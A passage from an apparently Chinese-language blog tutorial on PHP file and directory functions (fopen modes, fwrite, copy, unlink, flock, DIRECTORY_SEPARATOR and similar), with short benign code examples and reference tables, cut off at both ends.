<p>&amp;emsp;<br>3.关闭文件：fclose()<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$fp</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">   <span class="variable">$contents</span> = fread(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">   fclose(<span class="variable">$fp</span>);</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$contents</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><strong>其他注意事项：</strong></p>
<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">t</td>
<td align="left">windows下将\n转为\r\n</td>
</tr>
<tr>
<td align="center">b</td>
<td align="left">二进制打开模式</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>说明：</strong></font><br>Windows 下提供了一个文本转换标记（’t’）可以透明地将 \n 转换为 \r\n。<br>与此对应还可以使用 ‘b’ 来强制使用二进制模式，这样就不会转换数据。要使用这些标记，要么用 ‘b’ 或者用 ‘t’ 作为 mode 参数的最后一个字符。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二-创建和修改文件内容"><a href="#二-创建和修改文件内容" class="headerlink" title="二. 创建和修改文件内容"></a><font color="#FF6347" face="Comic sans MS">二. 创建和修改文件内容</font></h3><h4 id="2-1-file-put-contents写入文件"><a href="#2-1-file-put-contents写入文件" class="headerlink" title="2.1 file_put_contents写入文件"></a><font color="#3CB371" face="Comic sans MS">2.1 file_put_contents写入文件</font></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>int file_put_contents ( string $文件路径, string $写入数据])</strong></font><br></font></p>
<blockquote>
<p><strong>功能：向指定的文件当中写入一个字符串，如果文件不存在则创建文件。返回的是写入的字节长度</strong></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$data</span> = <span class="string">&quot;在PHP中文网学好PHP，妹子票子不再话下！&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$numbytes</span> = file_put_contents(<span class="string">&#x27;bin.txt&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$numbytes</span>)&#123;</span><br><span class="line">      <span class="comment">//$numbytes接收到整形的数字</span></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;写入成功，我们读取看看结果试试：&#x27;</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;bin.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;写入失败或者没有权限，注意检查&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="2-2-fwrite配合fopen进行写入操作、fopen-打开模式的比较"><a href="#2-2-fwrite配合fopen进行写入操作、fopen-打开模式的比较" class="headerlink" title="2.2 fwrite配合fopen进行写入操作、fopen()打开模式的比较"></a><font color="#3CB371" face="Comic sans MS">2.2 fwrite配合fopen进行写入操作、fopen()打开模式的比较</font></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>int fwrite ( resource $文件资源变量, string $写入的字符串 [, int 长度])</strong></font><br>注：fwrite的别名函数是fputs</p>
<p><font color="red"><strong>1. fopen()的w模式：</strong></font>写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建。每一次写入新的数据时，都会将原来的数据清空之后才写入！<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line">   <span class="variable">$fp</span>= fopen(<span class="variable">$filename</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">   <span class="variable">$len</span> = fwrite(<span class="variable">$fp</span>, <span class="string">&#x27;我是一只来自北方的狼，却在南方冻成了狗&#x27;</span>);</span><br><span class="line">   fclose(<span class="variable">$fp</span>);</span><br><span class="line">   <span class="keyword">print</span> <span class="variable">$len</span> .<span class="string">&#x27;字节被写入了\n&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><font color="#FF7F00"><strong>总结：</strong></font><br><strong>1. 不论有没有新建都会打开文件重新写入<br>2.原有的文件内容会被覆盖掉<br>3.文件不存在会创建</strong></p>
</blockquote>
<p>那我们来对比一下以下几个模式的不同：</p>
<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">r</td>
<td align="left">只能读不能使用fwrite写</td>
</tr>
<tr>
<td align="center">r+</td>
<td align="left">可操作读、写(可使用fwrite写入)</td>
</tr>
<tr>
<td align="center">w</td>
<td align="left">只可以写功能</td>
</tr>
<tr>
<td align="center">w+</td>
<td align="left">即可读又可以写</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h4 id="2-3-a模式和w模式、x模式和w模式的不同"><a href="#2-3-a模式和w模式、x模式和w模式的不同" class="headerlink" title="2.3 a模式和w模式、x模式和w模式的不同"></a><font color="#3CB371" face="Comic sans MS">2.3 a模式和w模式、x模式和w模式的不同</font></h4><p><font color="#FF7F00"><strong>1. a模式和w模式总结：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="left">总结</th>
</tr>
</thead>
<tbody><tr>
<td align="center">x</td>
<td align="left">每次写入会干掉原有文件的内容，文件不存在都会创建</td>
</tr>
<tr>
<td align="center">a</td>
<td align="left">每次写入都会向文件的尾端追加内容</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>2. x模式和w模式总结：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line">   <span class="variable">$fp</span>= fopen(<span class="variable">$filename</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">   <span class="variable">$len</span> = fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;读大学迷茫了，PHP中文网学PHP给你希望&#x27;</span>);</span><br><span class="line">   <span class="keyword">echo</span>  <span class="variable">$len</span> .<span class="string">&#x27;字节被写入了\n&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>总结：</strong><br>   1.文件存在的时候会报错<br>   2.如果把$filename 改成其他的文件名,就可以了。但是，再次刷新的时候又报错了<br>   3.x+ 是增强的x模式。读取时也可以使用。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三-创建临时文件"><a href="#三-创建临时文件" class="headerlink" title="三. 创建临时文件"></a><font color="#FF6347" face="Comic sans MS">三. 创建临时文件</font></h3><p>使用这个函数：<font color="#00B2EE"><strong>resource tmpfile ( )</strong></font></p>
<blockquote>
<p><strong>功能：创建一个临时文件，返回资源类型。关闭文件即被删除。</strong></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //创建了一个临时文件,创建后并且打开这个文件	</span><br><span class="line">   <span class="variable">$handle</span> = tmpfile();</span><br><span class="line"></span><br><span class="line">   //向里面写入了数据</span><br><span class="line">   <span class="variable">$numbytes</span> = fwrite(<span class="variable">$handle</span>, <span class="string">&#x27;写入临时文件&#x27;</span>);</span><br><span class="line"></span><br><span class="line">   //关闭临时文件，文件即被删除</span><br><span class="line">   fclose(<span class="variable">$handle</span>);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">echo</span>  <span class="string">&#x27;向临时文件中写入了&#x27;</span>.<span class="variable">$numbytes</span> . <span class="string">&#x27;个字节&#x27;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="四-移动、拷贝和删除文件"><a href="#四-移动、拷贝和删除文件" class="headerlink" title="四. 移动、拷贝和删除文件"></a><font color="#FF6347" face="Comic sans MS">四. 移动、拷贝和删除文件</font></h3><h4 id="4-1-重命名文件"><a href="#4-1-重命名文件" class="headerlink" title="4.1 重命名文件"></a><font color="#3CB371" face="Comic sans MS">4.1 重命名文件</font></h4><p><font face="Comic sans MS"><strong>bool</strong> <font color="#00B2EE"><strong>rename(oldname,newname,context)</strong></font>;<br></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">oldname</td>
<td align="left">必需。规定要重命名的<strong>文件</strong>或**目录(文件夹)**。</td>
</tr>
<tr>
<td align="center">newname</td>
<td align="left">必需。规定文件或目录的新名称。</td>
</tr>
<tr>
<td align="center">context</td>
<td align="left">可选。规定文件句柄的环境。context 是可修改流的行为的一套选项。</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//旧文件名</span></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;test.php.old&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//新文件名</span></span><br><span class="line">   <span class="variable">$filename2</span> = <span class="string">&#x27;test.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//复制文件</span></span><br><span class="line">   rename(<span class="variable">$filename</span>, <span class="variable">$filename2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="4-2-复制文件"><a href="#4-2-复制文件" class="headerlink" title="4.2 复制文件"></a><font color="#3CB371" face="Comic sans MS">4.2 复制文件</font></h4><p><font face="Comic sans MS"><strong>bool</strong> <font color="#00B2EE"><strong>copy(源文件,目标文件)</strong></font>;<br></font> </p>
<blockquote>
<p><strong>功能：将指定路径的源文件，复制一份到目标文件的位置。如果复制到当前目录下，则必须重新改一个名字，其他目录下的话也要在目的路径下加上文件名，不管改不改名字。</strong></p>
</blockquote>
<p>copy(source,destination):</p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">source</td>
<td align="left">必需。规定要复制的文件。</td>
</tr>
<tr>
<td align="center">destination</td>
<td align="left">必需。规定复制文件的目的地。</td>
</tr>
</tbody></table>
<p>(1)创建文件并复制到当前文件夹下面<font color="#FF7F00">↓↓</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//创建文件</span></span><br><span class="line">   <span class="variable">$fi</span> = fopen(<span class="string">&#x27;copy.txt&#x27;</span>,<span class="string">&quot;w&quot;</span>);  </span><br><span class="line">   <span class="variable">$a</span>=fwrite(<span class="variable">$fi</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">   <span class="comment">//旧文件名 </span></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;copy.txt&#x27;</span>;  </span><br><span class="line">   <span class="comment">//新文件名   </span></span><br><span class="line">   <span class="variable">$filename2</span> = <span class="variable">$filename</span> . <span class="string">&#x27;_new.txt&#x27;</span>;  </span><br><span class="line"></span><br><span class="line">   <span class="comment">//修改名字。</span></span><br><span class="line">   copy(<span class="variable">$filename</span>, <span class="variable">$filename2</span>);</span><br><span class="line">   fclose(<span class="variable">$fi</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>(2)创建文件并复制到其他文件夹下面<font color="#FF7F00">↓↓</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//创建文件</span></span><br><span class="line">   <span class="variable">$fi</span> = fopen(<span class="string">&#x27;copy.txt&#x27;</span>,<span class="string">&quot;w&quot;</span>);  </span><br><span class="line">   <span class="variable">$a</span>=fwrite(<span class="variable">$fi</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">   <span class="comment">//旧文件名 </span></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;copy.txt&#x27;</span>;  </span><br><span class="line">   <span class="comment">//新文件名   </span></span><br><span class="line">   <span class="variable">$filename2</span> = <span class="string">&quot;./01/copy.txt&quot;</span>;  </span><br><span class="line"></span><br><span class="line">   <span class="comment">//修改名字。</span></span><br><span class="line">   copy(<span class="variable">$filename</span>, <span class="variable">$filename2</span>);</span><br><span class="line">   fclose(<span class="variable">$fi</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;</p>
<h4 id="4-3-删除文件"><a href="#4-3-删除文件" class="headerlink" title="4.3 删除文件"></a><font color="#3CB371" face="Comic sans MS">4.3 删除文件</font></h4><p><font face="Comic sans MS"><strong>bool</strong> <font color="#00B2EE"><strong>unlink(指定路径的文件)</strong></font>;<br></font> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (unlink(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">       <span class="keyword">echo</span>  <span class="string">&quot;删除文件成功 <span class="subst">$filename</span>!\n&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;删除 <span class="subst">$filename</span> 失败!\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="五-检测文件属性函数"><a href="#五-检测文件属性函数" class="headerlink" title="五. 检测文件属性函数"></a><font color="#FF6347" face="Comic sans MS">五. 检测文件属性函数</font></h3><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">bool file_exists ( $指定文件名或者文件路径)</td>
<td align="left">文件是否存在</td>
</tr>
<tr>
<td align="left">bool is_readable ( $指定文件名或者文件路径)</td>
<td align="left">文件是否可读</td>
</tr>
<tr>
<td align="left">bool is_writeable ( $指定文件名或者文件路径)</td>
<td align="left">文件是否可写</td>
</tr>
<tr>
<td align="left">bool is_executable ( $指定文件名或者文件路径)</td>
<td align="left">文件是否可执行</td>
</tr>
<tr>
<td align="left">bool is_file ( $指定文件名或者文件路径)</td>
<td align="left">是否是文件</td>
</tr>
<tr>
<td align="left">bool is_dir ( $指定文件名或者文件路径)</td>
<td align="left">是否是目录</td>
</tr>
<tr>
<td align="left">void clearstatcache ( void )</td>
<td align="left">清楚文件的状态缓存</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$g</span>=file_exists(<span class="string">&quot;install.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$g</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">&#x27;install.txt&#x27;</span>))&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;已安装，请不要再次进行安装&#x27;</span>;</span><br><span class="line">   <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="keyword">echo</span> <span class="number">5462564</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运行结果：<span class="number">1</span> 已安装，请不要再次进行安装</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="六-文件常用函数和常量"><a href="#六-文件常用函数和常量" class="headerlink" title="六. 文件常用函数和常量"></a><font color="#FF6347" face="Comic sans MS">六. 文件常用函数和常量</font></h3><h4 id="6-1-目录分割符常量"><a href="#6-1-目录分割符常量" class="headerlink" title="6.1 目录分割符常量"></a><font color="#3CB371" face="Comic sans MS">6.1 目录分割符常量</font></h4><table>
<thead>
<tr>
<th align="center">平台</th>
<th align="left">分割符</th>
</tr>
</thead>
<tbody><tr>
<td align="center">windows</td>
<td align="left">\ 或者 &#x2F;</td>
</tr>
<tr>
<td align="center">类unix</td>
<td align="left">&#x2F;</td>
</tr>
</tbody></table>
<blockquote>
<ol>
<li>windows 的路径格式为 d:\xxx\xxx 注意：windows支持 d:&#x2F;xxx&#x2F;xxx</li>
<li>linux 的路径格式为 &#x2F;home&#x2F;xxx&#x2F;xxx 注意：如果\home\xxx\xxx 在linux上是<strong>错误</strong>的</li>
<li>所以当开启转义之类的话，转义字符 \ 用一起的话 d:\xxx\xxx 是一样的。判断时候有两个 \ 有的话 再转成一个\ 再把 \ 替换成 &#x2F;当路径分割，这样在linux上或者windos上的路径就能保持统一了。</li>
</ol>
</blockquote>
<p>&amp;emsp;</p>
<h4 id="6-2-DIRECTORY-SEPARATOR常量"><a href="#6-2-DIRECTORY-SEPARATOR常量" class="headerlink" title="6.2 DIRECTORY_SEPARATOR常量"></a><font color="#3CB371" face="Comic sans MS">6.2 DIRECTORY_SEPARATOR常量</font></h4><p><font face="Comic sans MS">在 Windows 中，斜线（&#x2F;）和反斜线（\）都可以用作目录分隔符，在linux上路径的分隔符是&#x2F;，这就导致了一个问题，比如开发机器是windows，有一个图片上传程序，，而我们又使用了(\)作为文件分隔符，调试机器上指定的上传文件保存目录是：<br>define(‘ROOT’,dirname(_<em>FILE</em>_).”\upload”)，在本地调试都很正常，但是上传到linux服务器的时候会发现会出错。<br>这个问题就是出在文件的分隔符上，windows上习惯性的使用\作为文件分隔符，但是在linux上人家是不认识这个标识的，人家只认识&#x2F;，于是就要引入下面这个php内置变量了：<font color="#00B2EE"><strong>DIRECTORY_SEPARATOR</strong></font>。</p>
<p>上面的写法可以改写为以下无错写法：<br>define(‘ROOT’,dirname(_<em>FILE</em>_).DIRECTORY_SEPARATOR.”upload”);<br>这样就可以确保不会出错了。<br></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>总结：</strong></font><br>DIRECTORY_SEPARATOR是一个<font color="#FF7F00"><strong>返回跟操作系统相关的路径分隔符</strong></font>的php内置命令，在windows上返回\，而在linux或者类unix上返回&#x2F;，就是这么个区别，通常在定义包含文件路径或者上传保存目录的时候会用到。</p>
</blockquote>
<p>&amp;emsp;</p>
<h4 id="6-3-文件指针操作函数"><a href="#6-3-文件指针操作函数" class="headerlink" title="6.3 文件指针操作函数"></a><font color="#3CB371" face="Comic sans MS">6.3 文件指针操作函数</font></h4><p><font color="#00B2EE"><strong>rewind ( resource handle)</strong></font></p>
<blockquote>
<p><strong>功能：指针回到开始处</strong></p>
</blockquote>
<p><font color="#00B2EE"><strong>fseek ( resource handle, int offset [, int from_where])</strong></font></p>
<blockquote>
<p><strong>功能：文件指针向后移动指定字符</strong></p>
</blockquote>
<p><strong>注意：</strong>我们在之前的读取当中我们发现fread读取指定长度的数据。读取指定长度的内容，下次再读取的时候<strong>从原位置开始再接着向后读取</strong>。</p>
<p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_fseek.asp">PHP fseek() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file</td>
<td align="left">必需。规定要在其中定位的文件。</td>
</tr>
<tr>
<td align="center">offset</td>
<td align="left">必需。<strong>规定新的位置</strong>（从文件头开始以字节数度量）。</td>
</tr>
<tr>
<td align="center">whence</td>
<td align="left">可选。<br>可能的值：<br>SEEK_SET - 设定位置等于 offset 字节。默认。<br>SEEK_CUR - 设定位置为当前位置加上 offset。<br>SEEK_END - 设定位置为文件末尾加上 offset （要移动到文件尾之前的位置，offset 必须是一个<br>负值）。</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h4 id="6-4-filesize-检测文件的大小"><a href="#6-4-filesize-检测文件的大小" class="headerlink" title="6.4 filesize 检测文件的大小"></a><font color="#3CB371" face="Comic sans MS">6.4 filesize 检测文件的大小</font></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;demo.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$filename</span> . <span class="string">&#x27;文件大小为: &#x27;</span> . filesize(<span class="variable">$filename</span>) . <span class="string">&#x27; bytes&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>还有一些其他操作文件的函数，读取文件：</p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file</td>
<td align="left">把整个文件读入一个数组中</td>
</tr>
<tr>
<td align="center">fgets</td>
<td align="left">从文件指针中读取一行,读到最后返回false</td>
</tr>
<tr>
<td align="center">fgetc</td>
<td align="left">从文件指针中读取一个字符，读到最后返回false</td>
</tr>
<tr>
<td align="center">ftruncate</td>
<td align="left">将文件截断到给定的长度</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h4 id="6-5-文件的时间函数"><a href="#6-5-文件的时间函数" class="headerlink" title="6.5 文件的时间函数"></a><font color="#3CB371" face="Comic sans MS">6.5 文件的时间函数</font></h4><table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">filectime</td>
<td align="left">文件创建时间</td>
</tr>
<tr>
<td align="center">filemtime</td>
<td align="left">文件修改时间</td>
</tr>
<tr>
<td align="center">fileatime</td>
<td align="left">文件上次访问时间</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;demo.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;$filename文件的上次访问时间是:&#x27;</span>  . date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, fileatime(<span class="variable">$filename</span>));</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;$filename文件的创建时间是: &#x27;</span> . date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, filectime(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$filename文件的修改时间是: &#x27;</span> . date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, filemtime(<span class="variable">$filename</span>));&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">```			</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line"><span class="comment">### &lt;font color=&quot;#FF6347&quot; face=&quot;Comic sans MS&quot;&gt;七. 文件锁处理机制&lt;/font&gt;</span></span><br><span class="line"></span><br><span class="line">&gt;**文件锁的用途：**</span><br><span class="line">若一个人在写入一个文件，另外一个人同时也打个了这个文件进行写入文件。</span><br><span class="line">这情况下，如果遇到一定的碰撞概率的话，不知道到底谁的操作为准。</span><br><span class="line">因此，这个时候我们引入锁机制。</span><br><span class="line">若用户A在写入或者读取这个文件的时候，将文件加上共享所。我可以读，其他人也可以读。</span><br><span class="line">但是，我如果这与的时候。我使用独占锁。这个文件归我了，你们都别动，除非我将文件锁进行释放。</span><br><span class="line"></span><br><span class="line">&lt;font color=<span class="string">&quot;#FF7F00&quot;</span>&gt;**注意：不论加上了文件锁后要注意释放。**&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">**<span class="keyword">bool</span>** &lt;font color=<span class="string">&quot;#00B2EE&quot;</span>&gt;**flock(file,lock,block)**&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">参数	|描述|</span><br><span class="line">:-:|:-|	</span><br><span class="line">file	|必需。规定要锁定或释放的已打开的文件。</span><br><span class="line">lock	|必需。规定要使用哪种锁定类型。&lt;br&gt;lock 参数可以是以下值之一：&lt;br&gt;要取得共享锁定（读取的程序），将 lock 设为 LOCK_SH（PHP <span class="number">4.0</span>.<span class="number">1</span> 以前的版本设置为 <span class="number">1</span>）&lt;br&gt;要取得独占锁定（写入的程序），将 lock 设为 LOCK_EX（PHP <span class="number">4.0</span>.<span class="number">1</span> 以前的版本中设置为 <span class="number">2</span>）&lt;br&gt;要释放锁定（无论共享或独占），将 lock 设为 LOCK_UN（PHP <span class="number">4.0</span>.<span class="number">1</span> 以前的版本中设置为 <span class="number">3</span>）&lt;br&gt;如果不希望 flock() 在锁定时堵塞，则给 lock 加上 LOCK_NB(PHP <span class="number">4.0</span>.<span class="number">1</span> 以前的版本中设置为 <span class="number">4</span>)</span><br><span class="line">block	|可选。若设置为 <span class="number">1</span> 或 <span class="literal">true</span>，则当进行锁定时阻挡其他进程。</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="string">&quot;demo.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进行排它型锁定</span></span><br><span class="line"><span class="keyword">if</span> (flock(<span class="variable">$fp</span>, LOCK_EX)) &#123; </span><br><span class="line"></span><br><span class="line">   fwrite(<span class="variable">$fp</span>, <span class="string">&quot;文件这个时候被我独占了哟\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 释放锁定</span></span><br><span class="line">   flock(<span class="variable">$fp</span>, LOCK_UN);    </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;锁失败，可能有人在操作，这个时候不能将文件上锁&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>说明：</strong></p>
</blockquote>
<ol>
<li>上例中我为了写入文件，把文件加上了独占锁。</li>
<li>如果我操作完成，写入完成后，解除掉了独占锁。</li>
</ol>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="八-目录-文件夹-处理函数"><a href="#八-目录-文件夹-处理函数" class="headerlink" title="八. 目录(文件夹)处理函数"></a><font color="#FF6347" face="Comic sans MS">八. 目录(文件夹)处理函数</font></h3><blockquote>
<p><font color="#FF7F00"><strong>处理文件夹的基本思想如下：</strong></font></p>
</blockquote>
<ol>
<li>读取某个路径的时候判断是否是文件夹</li>
<li>是文件夹的话，打开指定文件夹，返回文件目录的资源变量</li>
<li>使用readdir读取一次目录中的文件，目录指针向后偏移一次</li>
<li>使用readdir读取到最后，没有可读的文件返回false</li>
<li>关闭文件目录</li>
</ol>
<p>&amp;emsp;<br>常用函数：</p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">opendir()</td>
<td align="left">打开文件夹，返回操作资源 &amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_directory_opendir.asp">PHP opendir() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">readdir()</td>
<td align="left">读取文件夹资源,返回目录中下一个文件的文件名。 &amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_directory_readdir.asp">PHP readdir() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">is_dir()</td>
<td align="left">判断是否是文件夹  &amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_is_dir.asp">PHP is_dir() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">closedir()</td>
<td align="left">关闭文件夹操作资源  &amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_directory_closedir.asp">PHP is_dir() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">filetype()</td>
<td align="left">显示是文件夹还是文件，文件显示file，文件夹显示dir <br>可能的类型：（fifo、char、dir、block、link、file、unknown）&amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_filetype.asp">PHP is_dir() 函数</a>]</font></td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="九-文件权限设置"><a href="#九-文件权限设置" class="headerlink" title="九. 文件权限设置"></a><font color="#FF6347" face="Comic sans MS">九. 文件权限设置</font></h3><ol>
<li><p><strong>文件权限设置的函数</strong>在系统管理级别的软件中很常用。<br>例如：某个文件不准许guest组（来宾用户）查看。</p>
</li>
<li><p>在企业管理中，某些用户或者某些用户文件只准读取不准修改。这都是非常常用的功能。</p>
</li>
<li><p>注：windows下面有些功能无法实现。</p>
</li>
</ol>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">chmod</td>
<td align="left">修改读取模式</td>
